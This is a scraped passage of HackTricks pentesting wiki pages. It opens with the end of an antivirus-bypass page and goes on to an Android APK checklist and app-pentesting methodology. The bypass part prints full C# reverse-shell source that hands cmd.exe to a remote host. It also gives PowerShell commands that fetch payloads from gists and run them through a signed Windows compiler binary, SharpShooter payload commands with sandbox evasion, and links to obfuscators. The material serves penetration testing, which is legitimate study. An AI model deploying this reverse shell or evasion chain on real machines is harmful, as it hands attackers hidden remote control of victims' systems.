<PORT>\nusing\nSystem\n;\nusing\nSystem\n.\nText\n;\nusing\nSystem\n.\nIO\n;\nusing\nSystem\n.\nDiagnostics\n;\nusing\nSystem\n.\nComponentModel\n;\nusing\nSystem\n.\nLinq\n;\nusing\nSystem\n.\nNet\n;\nusing\nSystem\n.\nNet\n.\nSockets\n;\n‚Äã\n‚Äã\nnamespace\nConnectBack\n{\npublic\nclass\nProgram\n{\nstatic\nStreamWriter\nstreamWriter\n;\n‚Äã\npublic\nstatic\nvoid\nMain\n(\nstring\n[]\nargs\n)\n{\nusing\n(\nTcpClient\nclient\n=\nnew\nTcpClient\n(\nargs\n[\n0\n],\nSystem\n.\nConvert\n.\nToInt32\n(\nargs\n[\n1\n])))\n{\nusing\n(\nStream\nstream\n=\nclient\n.\nGetStream\n())\n{\nusing\n(\nStreamReader\nrdr\n=\nnew\nStreamReader\n(\nstream\n))\n{\nstreamWriter\n=\nnew\nStreamWriter\n(\nstream\n);\nStringBuilder\nstrInput\n=\nnew\nStringBuilder\n();\n‚Äã\nProcess\np\n=\nnew\nProcess\n();\np\n.\nStartInfo\n.\nFileName\n=\n\"cmd.exe\"\n;\np\n.\nStartInfo\n.\nCreateNoWindow\n=\ntrue\n;\np\n.\nStartInfo\n.\nUseShellExecute\n=\nfalse\n;\np\n.\nStartInfo\n.\nRedirectStandardOutput\n=\ntrue\n;\np\n.\nStartInfo\n.\nRedirectStandardInput\n=\ntrue\n;\np\n.\nStartInfo\n.\nRedirectStandardError\n=\ntrue\n;\np\n.\nOutputDataReceived\n+=\nnew\nDataReceivedEventHandler\n(\nCmdOutputDataHandler\n);\np\n.\nStart\n();\np\n.\nBeginOutputReadLine\n();\n‚Äã\nwhile\n(\ntrue\n)\n{\nstrInput\n.\nAppend\n(\nrdr\n.\nReadLine\n());\n//strInput.Append(\"\\n\");\np\n.\nStandardInput\n.\nWriteLine\n(\nstrInput\n);\nstrInput\n.\nRemove\n(\n0\n,\nstrInput\n.\nLength\n);\n}\n}\n}\n}\n}\n‚Äã\nprivate\nstatic\nvoid\nCmdOutputDataHandler\n(\nobject\nsendingProcess\n,\nDataReceivedEventArgs\noutLine\n)\n{\nStringBuilder\nstrOutput\n=\nnew\nStringBuilder\n();\n‚Äã\nif\n(\n!\nString\n.\nIsNullOrEmpty\n(\noutLine\n.\nData\n))\n{\ntry\n{\nstrOutput\n.\nAppend\n(\noutLine\n.\nData\n);\nstreamWriter\n.\nWriteLine\n(\nstrOutput\n);\nstreamWriter\n.\nFlush\n();\n}\ncatch\n(\nException\nerr\n)\n{\n}\n}\n}\n‚Äã\n}\n}\n‚Äã\nhttps://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs\n‚Äã\nC# using compiler\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt\n‚Äã\nREV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066\n‚Äã\n‚Äã\nREV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639\n‚Äã\nAutomatic download and execution:\n64bit\n:\npowershell\n-\ncommand\n\"& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\\REV.txt') }\"\n&&\npowershell\n-\ncommand\n\"& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\\Rev.Shell') }\"\n&&\nC\n:\n\\Windows\\Microsoft\n.\nNet\\Framework64\\v4\n.\n0.30319\n\\Microsoft\n.\nWorkflow\n.\nCompiler\n.\nexe REV\n.\ntxt Rev\n.\nShell\n‚Äã\n32bit\n:\npowershell\n-\ncommand\n\"& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\\REV.txt') }\"\n&&\npowershell\n-\ncommand\n\"& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\\Rev.Shell') }\"\n&&\nC\n:\n\\Windows\\Microsoft\n.\nNet\\Framework\\v4\n.\n0.30319\n\\Microsoft\n.\nWorkflow\n.\nCompiler\n.\nexe REV\n.\ntxt Rev\n.\nShell\nC# obfuscators list:\nhttps://github.com/NotPrab/.NET-Obfuscator\n‚Äã\nC++\nsudo apt-get install mingw-w64\n‚Äã\ni686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc\n‚Äã\nhttps://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp\n‚Äã\nMerlin, Empire, Puppy, SalsaTools https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/\n‚Äã\nhttps://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf\n‚Äã\nhttps://github.com/l0ss/Grouper2\nPractical use of JavaScript and COM Scriptlets for Penetration Testing\nBypassing Detection for a Reverse Meterpreter Shell - Checkmate\nCheckmate\nOther tools\n# Veil Framework:\nhttps://github.com/Veil-Framework/Veil\n‚Äã\n# Shellter\nhttps://www.shellterproject.com/download/\n‚Äã\n# Sharpshooter\n# https://github.com/mdsecactivebreach/SharpShooter\n# Javascript Payload Stageless:\nSharpShooter.py\n--stageless\n--dotnetver\n4\n--payload\njs\n--output\nfoo\n--rawscfile\n./raw.txt\n--sandbox\n1\n=\ncontoso,2,3\n‚Äã\n# Stageless HTA Payload:\nSharpShooter.py\n--stageless\n--dotnetver\n2\n--payload\nhta\n--output\nfoo\n--rawscfile\n./raw.txt\n--sandbox\n4\n--smuggle\n--template\nmcafee\n‚Äã\n# Staged VBS:\nSharpShooter.py\n--payload\nvbs\n--delivery\nboth\n--output\nfoo\n--web\nhttp://www.foo.bar/shellcode.payload\n--dns\nbar.foo\n--shellcode\n--scfile\n./csharpsc.txt\n--sandbox\n1\n=\ncontoso\n--smuggle\n--template\nmcafee\n--dotnetver\n4\n‚Äã\n# Donut:\nhttps://github.com/TheWover/donut\n‚Äã\n# Vulcan\nhttps://github.com/praetorian-code/vulcan\nMore\nhttps://github.com/persianhydra/Xeexe-TopAntivirusEvasion\ngithub.com\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nPowerView/SharpView\nNext\n- Mobile Pentesting\nAndroid APK Checklist\nLast modified\n2mo ago"
    },
    {
        "title": "Android APK Checklist",
        "url": "https://book.hacktricks.xyz/mobile-pentesting/android-checklist",
        "text": "Android APK Checklist\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\nLearn Android fundamentals\n‚Äã\n‚Äã\nBasics\n‚Äã\n‚Äã\nDalvik & Smali\n‚Äã\n‚Äã\nEntry points\n‚Äã\n‚Äã\nActivities\n‚Äã\n‚Äã\nURL Schemes\n‚Äã\n‚Äã\nContent Providers\n‚Äã\n‚Äã\nServices\n‚Äã\n‚Äã\nBroadcast Receivers\n‚Äã\n‚Äã\nIntents\n‚Äã\n‚Äã\nIntent Filter\n‚Äã\n‚Äã\nOther components\n‚Äã\n‚Äã\nHow to use ADB\n‚Äã\n‚Äã\nHow to modify Smali\n‚Äã\n‚Äã\nStatic Analysis\n‚Äã\nCheck for the use of\nobfuscation\n, checks for noting if the mobile was rooted, if an emulator is being used and anti-tampering checks.\nRead this for more info\n.\nSensitive applications (like bank apps) should check if the mobile is rooted and should actuate in consequence.\nSearch for\ninteresting strings\n(passwords, URLs, API, encryption, backdoors, tokens, Bluetooth uuids...).\nSpecial attention to\nfirebase\nAPIs.\n‚Äã\nRead the manifest:\n‚Äã\nCheck if the application is in debug mode and try to \"exploit\" it\nCheck if the APK allows backups\nExported Activities\nContent Providers\nExposed services\nBroadcast Receivers\nURL Schemes\nIs the application s\naving data insecurely internally or externally\n?\nIs there any\npassword hard coded or saved in disk\n? Is the app\nusing insecurely crypto algorithms\n?\nAll the libraries compiled using the PIE flag?\nDon't forget that there is a bunch of\nstatic Android Analyzers\nthat can help you a lot during this phase.\n‚Äã\nDynamic Analysis\n‚Äã\nPrepare the environment (\nonline\n,\nlocal VM or physical\n)\nIs there any\nunintended data leakage\n(logging, copy/paste, crash logs)?\n‚Äã\nConfidential information being saved in SQLite dbs\n?\n‚Äã\nExploitable exposed Activities\n?\n‚Äã\nExploitable Content Providers\n?\n‚Äã\nExploitable exposed Services\n?\n‚Äã\nExploitable Broadcast Receivers\n?\nIs the application\ntransmitting information in clear text/using weak algorithms\n? is a MitM possible?\n‚Äã\nInspect HTTP/HTTPS traffic\n‚Äã\nThis one is really important, because if you can capture the HTTP traffic you can search for common Web vulnerabilities (Hacktricks has a lot of information about Web vulns).\nCheck for possible\nAndroid Client Side Injections\n(probably some static code analysis will help here)\n‚Äã\nFrida\n: Just Frida, use it to obtain interesting dynamic data from the application (maybe some passwords...)\nSome obfuscation/Deobfuscation information\n‚Äã\nRead here\n‚Äã\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWindows Hardening -\nPrevious\nAntivirus (AV) Bypass\nNext\n- Mobile Pentesting\nAndroid Applications Pentesting\nLast modified\n2mo ago"
    },
    {
        "title": "Android Applications Pentesting",
        "url": "https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting",
        "text": "Android Applications Pentesting\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nAndroid Applications Basics\nIt's highly recommended to start reading this page to know about the\nmost important parts related to Android security and the most dangerous components in an Android application\n:\nAndroid Applications Basics\nADB (Android Debug Bridge)\nThis is the main tool you need to connect to an android device (emulated or physical).\nIt allows you to control your device over\nUSB\nor\nNetwork\nfrom a computer,\ncopy\nfiles back and forth,\ninstall\nand uninstall apps, run\nshell\ncommands, perform\nbackups\n, read\nlogs\nand more.\nTake a look to the following list of\nADB Commands\nto learn how to use adb.\nSmali\nSometimes it is interesting to\nmodify the application code\nto access\nhidden information\n(maybe well obfuscated passwords or flags). Then, it could be interesting to decompile the apk, modify the code and recompile it.\nIn this tutorial\nyou can\nlearn how to decompile and APK, modify Smali code and recompile the APK\nwith the new functionality\n. This could be very useful as an\nalternative for several tests during the dynamic analysis\nthat are going to presented. Then,\nkeep always in mid this possibility\n.\nOther interesting tricks\n‚Äã\nSpoofing your location in Play Store\n‚Äã\nDownload APKs\n:\nhttps://apps.evozi.com/apk-downloader/\n,\nhttps://apkpure.com/es/\n,\nhttps://www.apkmirror.com/\n,\nhttps://apkcombo.com/es-es/apk-downloader/\n‚Äã\nExtract APK from device:\nadb shell pm list packages\ncom.android.insecurebankv2\n‚Äã\nadb shell pm path com.android.insecurebankv2\npackage:/data/app/com.android.insecurebankv2-Jnf8pNgwy3QA_U5f-n_4jQ\n==\n/base.apk\n‚Äã\nadb pull /data/app/com.android.insecurebankv2- Jnf8pNgwy3QA_U5f-n_4jQ\n==\n/base.apk\nStatic Analysis\nFirst of all, for analysing an APK you should\ntake a look to the to the Java code\nusing a decompiler.\nPlease,\nread here to find information about different available decompilers\n.\nLooking for interesting Info\nJust taking a look to the\nstrings\nof the APK you can search for\npasswords\n,\nURLs\n(\nhttps://github.com/ndelphit/apkurlgrep\n),\napi\nkeys,\nencryption\n,\nbluetooth uuids\n,\ntokens\nand anything interesting... look even for code execution\nbackdoors\nor authentication backdoors (hardcoded admin credentials to the app).\nFirebase\nPay special attention to\nfirebase URLs\nand check if it is bad configured.\nMore information about whats is FIrebase and how to exploit it here.\n‚Äã\nBasic understanding of the application - Manifest.xml, strings.xml\nUsing any of the\ndecompilers\nmentioned\nhere\nyou will be able to read the\nManifest.xml\n. You could also\nrename\nthe\napk\nfile extension\nto .zip\nand\nunzip\nit.\nReading the\nmanifest\nyou can find\nvulnerabilities\n:\nFirst of all, check if\nthe application is debuggeable\n. A production APK shouldn't be (or others will be able to connect to it). You can check if an application is debbugeable looking in the manifest for the attribute\ndebuggable=\"true\"\ninside the tag\n<application\nExample:\n<application theme=\"@2131296387\" debuggable=\"true\"\n‚Äã\nLearn here\nhow to find debuggeable applications in a phone and exploit them\nBackup\n: The\nandroid:allowBackup\nattribute defines whether application data can be backed up and restored by a user who has enabled usb debugging. If backup flag is set to true, it allows an attacker to take the backup of the application data via adb even if the device is not rooted. Therefore applications that handle and store sensitive information such as card details, passwords etc. should have this setting explicitly set to\nfalse\nbecause by default it is set to\ntrue\nto prevent such risks.\n<application android:allowBackup=\"false\"\nNetworkSecurity:\nThe application network security can be overwritten the defaults values with\nandroid:networkSecurityConfig=\"@xml/network_security_config\"\n. A file with that name may be put in\nres/xml.\nThis file will configure important security settings like certificate pins or if it allows HTTP traffic. You can read here more information about all the things that can be configure, but check this example about how to configure HTTP traffic for some domains:\n<domain-config cleartextTrafficPermitted=\"true\"> <domain includeSubdomains=\"true\">formation-software.co.uk </domain></domain-config>\nExported activities\n: Check for exported activities inside the manifest as this could be dangerous. Later in the dynamic analysis it will be explained how\nyou can abuse this behaviour\n.\nContent Providers\n: If an exported provider is being exposed, you could b able to access/modify interesting information. In dynamic analysis\nyou will learn how to abuse them\n.\nCheck for\nFileProviders\nconfigurations inside the attribute\nandroid:name=\"android.support.FILE_PROVIDER_PATHS\"\n.\nRead here to learn more about FileProviders\n.\nExposed Services\n: Depending on what the service is doing internally vulnerabilities could be exploited. In dynamic analysis\nyou will learn how to abuse them\n.\nBroadcast Receivers\n:\nYou will learn how you can possibly exploit them\nduring the dynamic analysis.\nURL scheme\n: Read the code of the activity managing the schema and look for vulnerabilities managing the input of the user. More info about\nwhat is an URL scheme here\n.\nminSdkVersion\n,\ntargetSDKVersion\n,\nmaxSdkVersion\n: They indicate the versions of Android the app will run on. It's important to keep them in mind because from a security perspective, supporting old version will allow known vulnerable versions of android to run it.\nReading\nresources.arsc/strings.xml\nyou can find some\ninteresting info\n:\nAPI Keys\nCustom schemas\nOther interesting info developers save in this file\nTapjacking\nTapjacking\nis an attack where a\nmalicious\napplication\nis launched and\npositions itself on top of a victim application\n. Once it visibly obscures the victim app, its user interface is designed in such a way as to trick the user to interact with it, while it is passing the interaction along to the victim app.\nIn effect, it is\nblinding the user from knowing they are actually performing actions on the victim app\n.\nFind more information in:\nTapjacking\nTask Hijacking\nAn\nactivity\nwith the\nlaunchMode\nset to\nsingleTask\nwithout any\ntaskAffinity\ndefined is vulnerable to task Hijacking. This means, that an\napplication\ncan be installed and if launched before the real application it could\nhijack the task of the real application\n(so the user will be interacting with the\nmalicious application thinking he is using the real one\n).\nMore info in:\nAndroid Task Hijacking\nInsecure data storage\nInternal Storage\nFiles\ncreated\non\ninternal\nstorage are\naccessible\nonly by the\napp\n. This protection is implemented by Android and is sufficient for most applications. But developers often use\nMODE_WORLD_READBALE\n&\nMODE_WORLD_WRITABLE\nto give access to those files to a different application, but this doesn‚Äôt limit other apps(malicious) from accessing them.\nDuring the\nstatic\nanalysis\ncheck\nfor the use of those\nmodes\n, during the\ndynamic\nanalysis\ncheck\nthe\npermissions\nof the files created (maybe some of them are worldwide readable/writable).\nMore information about this vulnerability and how to fix it here.\n‚Äã\nExternal Storage\nFiles created on\nexternal storage\n, such as SD Cards, are\nglobally readable and writable\n. Because external storage can be removed by the user and also modified by any application, you should\nnot store sensitive information using external storage\n.\nAs with data from any untrusted source, you should\nperform input validation\nwhen handling\ndata from external storage\n. We strongly recommend that you not store executables or class files on external storage prior to dynamic loading. If your app does retrieve executable files from external storage, the files should be signed and cryptographically verified prior to dynamic loading.\nInfo taken from\nhere\n.\nExternal storage can be\naccessed\nin\n/storage/emulated/0\n,\n/sdcard\n,\n/mnt/sdcard\nStarting with Android 4.4 (\nAPI 17\n), the SD card has a directory structure which\nlimits access from an app to the directory which is specifically for that app\n. This prevents malicious application from gaining read or write access to another app's files.\nSensitive data stored in clear-text\nShared preferences\n: Android allow to each application to easily save xml files in the path\n/data/data/<packagename>/shared_prefs/\nand sometimes it's possible to find sensitive information in clear-text in that folder.\nDatabases\n: Android allow to each application to easily save sqlite databases in the path\n/data/data/<packagename>/databases/\nand sometimes it's possible to find sensitive information in clear-text in that folder.\nBroken TLS\nAccept All Certificates\nFor some reason sometimes developers accept all the certificates even if for example the hostname does not match with lines of code like the following one:\nSSLSocketFactory\nsf\n=\nnew\ncc\n(\ntrustStore\n);\nsf\n.\nsetHostnameVerifier\n(\nSSLSocketFactory\n.\nALLOW_ALL_HOSTNAME_VERIFIER\n);\nA good way to test this is to try to capture the traffic using some proxy like Burp without authorising Burp CA inside the device. Also, you can generate with Burp a certificate for a different hostname and use it.\nBroken Cryptography\nPoor Key Management Processes\nSome developers save sensitive data in the local storage and encrypt it with a key hardcoded/predictable in the code. This shouldn't be done as some reversing could allow attackers to extract the confidential information.\nUse of Insecure and/or Deprecated Algorithms\nDevelopers shouldn't use\ndeprecated algorithms\nto perform authorisation\nchecks\n,\nstore\nor\nsend\ndata. Some of these algorithms are: RC4, MD4, MD5, SHA1... If\nhashes\nare used to store passwords for example, hashes brute-force\nresistant\nshould be used with salt.\nOther checks\nIt's recommended to\nobfuscate the APK\nto difficult the reverse engineer labour to attackers.\nIf the app is sensitive (like bank apps), it should perform it's\nown checks to see if the mobile is rooted\nand act in consequence.\nIf the app is sensitive (like bank apps), it should check if an\nemulator\nis being used.\nIf the app is sensitive (like bank apps), it should\ncheck it's own integrity before executing\nit to check if it was modified.\nUse\nAPKiD\nto check which compiler/packer/obfuscator was used to build the APK\nReact Native Application\nRead the following page to learn how to easily access javascript code of React applications:\nReact Native Application\nXamarin Applications\nRead the following page to learn how to easily access C# code of a xamarin applications:\nXamarin Apps\nSuperpacked Applications\nAccording to this\nblog post\nsuperpacked is a Meta algorithm that compress the content of an application into a single file. The blog talks about the possibility of creating an app that decompress these kind of apps... and a faster way which involves to\nexecute the application and gather the decompressed files from the filesystem.\nAutomated Static Code Analysis\nThe tool\nmariana-trench\nis capable of finding\nvulnerabilities\nby\nscanning\nthe\ncode\nof the application. This tool contains a series of\nknown sources\n(that indicates to the tool the\nplaces\nwhere the\ninput\nis\ncontrolled by the user\n),\nsinks\n(which indicates to the tool\ndangerous\nplaces\nwhere malicious user input could cause damages) and\nrules\n. These rules indicates the\ncombination\nof\nsources-sinks\nthat indicates a vulnerability.\nWith this knowledge,\nmariana-trench will review the code and find possible vulnerabilities on it\n.\nSecrets leaked\nAn application may contain secrets (API keys, passwords, hidden urls, subdomains...) inside of it that you might be able to discover. You could us a tool such as\nhttps://github.com/dwisiswant0/apkleaks\n‚Äã\nBypass Biometric Authentication\nBypass Biometric Authentication (Android)\nOther interesting functions\nCode execution\n:\nRuntime.exec(), ProcessBuilder(), native code:system()\nSend SMSs\n:\nsendTextMessage, sendMultipartTestMessage\nNative functions\ndeclared as\nnative\n:\npublic native, System.loadLibrary, System.load\n‚Äã\nRead this to learn\nhow to reverse native functions\n‚Äã\nOther tricks\ncontent:// protocol\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nDynamic Analysis\nFirst of all, you need an environment where you can install the application and all the environment (Burp CA cert, Drozer and Frida mainly). Therefore, a rooted device (emulated or not) is extremely recommended.\nOnline Dynamic analysis\nYou can create a\nfree account\nin:\nhttps://appetize.io/\n. This platform allows you to\nupload\nand\nexecute\nAPKs, so it is useful to see how an apk is behaving.\nYou can even\nsee the logs of your application\nin the web and connect through\nadb\n.\nThanks to the ADB connection you can use\nDrozer\nand\nFrida\ninside the emulators.\nLocal Dynamic Analysis\nUsing an emulator\n‚Äã\nAndroid Studio\n(You can create\nx86\nand\narm\ndevices, and according to\nthis\nlatest x86\nversions\nsupport ARM libraries\nwithout needing an slow arm emulator).\nLearn to set it up in this page:\nAVD - Android Virtual Device\n‚Äã\nGenymotion\n(Free version:\nPersonal Edition, you need to create an account.\nIt's recommend to\ndownload\nthe version\nWITH\nVirtualBox\nto avoid potential errors.\n)\n‚Äã\nNox\n(Free, but it doesn't support Frida or Drozer).\nWhen creating a new emulator on any platform remember that the bigger the screen is, the slower the emulator will run. So select small screens if possible.\nTo\ninstall google services\n(like AppStore) in Genymotion you need to click on the red marked button of the following image:\nAlso, notice that in the\nconfiguration of the Android VM in Genymotion\nyou can select\nBridge Network mode\n(this will be useful if you will be connecting to the Android VM from a different VM with the tools).\nUse a physical device\nYou need to activate the\ndebugging\noptions and it will be cool if you can\nroot\nit:\n1.\nSettings\n.\n2.\n(FromAndroid 8.0) Select\nSystem\n.\n3.\nSelect\nAbout phone\n.\n4.\nPress\nBuild number\n7 times.\n5.\nGo back and you will find the\nDeveloper options\n.\nOnce you have installed the application, the first thing you should do is to try it and investigate what does it do, how does it work and get comfortable with it.\nI will suggest to\nperform this initial dynamic analysis using MobSF dynamic analysis + pidcat\n, so will will be able to\nlearn how the application works\nwhile MobSF\ncapture\na lot of\ninteresting\ndata\nyou can review later on.\nUnintended Data Leakage\nLogging\nOften Developers leave debugging information publicly. So any application with\nREAD_LOGS\npermission can\naccess those logs\nand can gain sensitive information through that.\nWhile navigating through the application use\npidcat\n(Recommended, it's easier to use and read\n) or\nadb logcat\nto read the created logs and\nlook for sensitive information\n.\nNote that from l\nater versions that Android 4.0\n,\napplications are only able to access their own logs\n. So applications cannot access other apps logs.\nAnyway, it's still recommended to\nnot log sensitive information\n.\nCopy/Paste Buffer Caching\nAndroid provides\nclipboard-based\nframework to provide copy-paste function in android applications. But this creates serious issue when some\nother application\ncan\naccess\nthe\nclipboard\nwhich contain some sensitive data.\nCopy/Paste\nfunction should be\ndisabled\nfor\nsensitive part\nof the application. For example, disable copying credit card details.\nCrash Logs\nIf an application\ncrashes\nduring runtime and it\nsaves logs\nsomewhere then those logs can be of help to an attacker especially in cases when android application cannot be reverse engineered. Then, avoid creating logs when applications crashes and if logs are sent over the network then ensure that they are sent over an SSL channel.\nAs pentester,\ntry to take a look to these logs\n.\nAnalytics Data Sent To 3rd Parties\nMost of the application uses other services in their application like Google Adsense but sometimes they\nleak some sensitive data\nor the data which is not required to sent to that service. This may happen because of the developer not implementing feature properly. You can\nlook by intercepting the traffic\nof the application and see whether any sensitive data is sent to 3rd parties or not.\nSQLite DBs\nMost of the applications will use\ninternal SQLite databases\nto save information. During the pentest take a\nlook\nto the\ndatabases\ncreated, the names of\ntables\nand\ncolumns\nand all the\ndata\nsaved because you could find\nsensitive information\n(which would be a vulnerability).\nDatabases should be located in\n/data/data/the.package.name/databases\nlike\n/data/data/com.mwr.example.sieve/databases\nIf the database is saving confidential information and is\nencrypted b\nut you can\nfind\nthe\npassword\ninside the application it's still a\nvulnerability\n.\nEnumerate the tables using\n.tables\nand enumerate the columns of the tables doing\n.schema <table_name>\nDrozer (Exploit Activities, Content Providers and Services)\nDrozer\nallows you to\nassume the role of an Android app\nand interact with other apps. It can do\nanything that an installed application can do\n, such as make use of Android‚Äôs Inter-Process Communication (IPC) mechanism and interact with the underlying operating system. From\nDrozer Guide\n.\nDrozer is s useful tool to\nexploit exported activities, exported services and Content Providers\nas you will learn in the following sections.\nExploiting exported Activities\n‚Äã\nRead this if you want to remind what is an Android Activity.\nAlso remember that the code of an activity starts with the\nonCreate\nmethod.\nAuthorisation bypass\nWhen an Activity is exported you can invoke its screen from an external app. Therefore, if an activity with\nsensitive information\nis\nexported\nyou could\nbypass\nthe\nauthentication\nmechanisms\nto access it.\nLearn how to exploit exported activities with Drozer.\n‚Äã\nYou can also start an exported activity from adb:\nPackageName is com.example.demo\nExported ActivityName is com.example.test.MainActivity\nadb shell am start\n-n\ncom.example.demo/com.example.test.MainActivity\nNOTE\n: MobSF will detect as malicious the use of\nsingleTask/singleInstance\nas\nandroid:launchMode\nin an activity, but due to\nthis\n, apparently this is only dangerous on old versions (API versions < 21).\nNote that an authorisation bypass is not always a vulnerability, it would depend on how the bypass works and which information is exposed.\nSensitive information leakage\nActivities can also return results\n. If you manage to find an exported and unprotected activity calling the\nsetResult\nmethod and\nreturning sensitive information\n, there is a sensitive information leakage.\nTapjacking\nIf tapjacking isn't prevented, you could abuse the exported activity to make the\nuser perform unexpected actions\n. For more info about\nwhat is Tapjacking follow the link\n.\nExploiting Content Providers - Accessing and manipulating sensitive information\n‚Äã\nRead this if you want to remind what is a Content Provider.\nContent providers are basically used to\nshare data\n. If an app has available content providers you may be able to\nextract sensitive\ndata from them. It also interesting to test possible\nSQL injections\nand\nPath Traversals\nas they could be vulnerable.\nLearn how to exploit Content Providers with Drozer.\n‚Äã\nExploiting Services\n‚Äã\nRead this if you want to remind what is a Service.\nRemember that a the actions of a Service start in the method\nonStartCommand\n.\nAs service is basically something that\ncan receive data\n,\nprocess\nit and\nreturns\n(or not) a response. Then, if an application is exporting some services you should\ncheck\nthe\ncode\nto understand what is it doing and\ntest\nit\ndynamically\nfor extracting confidential info, bypassing authentication measures...\nLearn how to exploit Services with Drozer.\n‚Äã\nExploiting Broadcast Receivers\n‚Äã\nRead this if you want to remind what is a Broadcast Receiver.\nRemember that a the actions of a Broadcast Receiver start in the method\nonReceive\n.\nA broadcast receiver will be waiting for a type of message. Depending on ho the receiver handles the message it could be vulnerable.\nLearn how to exploit Broadcast Receivers with 